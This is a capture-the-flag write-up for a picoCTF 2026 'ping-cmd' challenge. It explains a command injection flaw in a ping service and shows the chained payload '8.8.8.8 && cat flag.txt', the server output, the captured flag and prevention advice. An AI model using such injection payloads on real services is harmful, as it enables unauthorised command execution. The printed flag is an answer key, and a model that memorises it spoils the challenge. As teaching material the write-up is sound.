---
title: "picoCTF 2026 – General Skills: ping-cmd (Ping Service)"
date: 2026-03-10
categories:
  - Misc
tags:
  - Misc
  - picoCTF
collections:
  - picoCTF
---



{{< admonition tldr "TL;DR" >}}

**picoCTF 2026 – General Skills: ping-cmd (Ping Service)** is a misc challenge from **picoCTF**. This challenge exposes a network service that allows users to input an IP address to be pinged. The service claims to have "tight security" and only allows the IP address `8.8.8.8` . The objective is to exploit this service to retrieve the flag.

{{< /admonition >}}

## Overview

This challenge exposes a network service that allows users to input an IP address to be pinged. The service claims to have "tight security" and only allows the IP address `8.8.8.8` . The objective is to exploit this service to retrieve the flag.

The service can be accessed using `nc` (netcat):

```bash
nc mysterious-sea.picoctf.net 63787
```

---

## Initial Interaction

After connecting to the service, it prompts the user for an IP address:

```
Enter an IP address to ping! (We have tight security because we only allow '8.8.8.8'):
```

Testing with the allowed value:

```
8.8.8.8
```

Produces normal ping output:

```
PING 8.8.8.8 (8.8.8.8) 56(84) bytes of data.
64 bytes from 8.8.8.8: icmp_seq=1 ttl=115 time=9.67 ms
64 bytes from 8.8.8.8: icmp_seq=2 ttl=115 time=9.70 ms
```

This indicates that the backend likely executes a system command similar to:

```
ping <user_input>
```

---

## Identifying the Vulnerability

The prompt suggests that only `8.8.8.8` is allowed, but the application appears to pass the input directly into a shell command.

If the input is not properly sanitized, shell metacharacters such as:

* `;` * `&&` * `|` * `$()` can be used to execute additional commands.

This type of vulnerability is known as **Command Injection**.

---

## Exploiting the Injection

To test whether additional commands can be executed, we append another command using `&&` .

Payloads:

```
8.8.8.8 && cat flag.txt
```

Explanation:

* `8.8.8.8` satisfies the input check.
* `&&` executes the next command only if the previous command succeeds.
* `cat flag.txt` attempts to read the flag file on the server.

---

## Executing the Exploit

Full interaction:

```bash
nc mysterious-sea.picoctf.net 63787
```

Inputs:

```
8.8.8.8 && cat flag.txt
```

Output:

```
PING 8.8.8.8 (8.8.8.8) 56(84) bytes of data.
64 bytes from 8.8.8.8: icmp_seq=1 ttl=115 time=9.67 ms
64 bytes from 8.8.8.8: icmp_seq=2 ttl=115 time=9.70 ms

--- 8.8.8.8 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss

picoCTF{p1nG_c0mm@nd_3xpL0it_su33essFuL_d1fdbdd0}
```

---

## Final Flags

```
picoCTF{p1nG_c0mm@nd_3xpL0it_su33essFuL_d1fdbdd0}
```

---

## Root Cause

The application likely executes user input in a shell context similar to:

```bash
system("ping " + user_input)
```

Because the input is not properly sanitized or escaped, attackers can inject additional shell commands.

---

## Prevention

To prevent command injection vulnerabilities:

1. **Avoid shell execution with user input** whenever possible.
2. Use safe APIs that do not invoke a shell.
3. Validate input strictly (e.g., using regex for IP addresses).
4. Escape or sanitize shell metacharacters.

Example safe validation:

```python
import re

if re.match(r'^8\.8\.8\.8$', user_input):
    run_ping()
```

---

## Key Takeaways

* Command injection occurs when user input is passed directly to a shell command.
* Shell operators such as `&&` , `;` , and `|` can chain additional commands.
* Even simple services (such as a ping tool) can become vulnerable if input validation is insufficient.
* Proper input validation and avoiding shell execution are essential for secure application design.
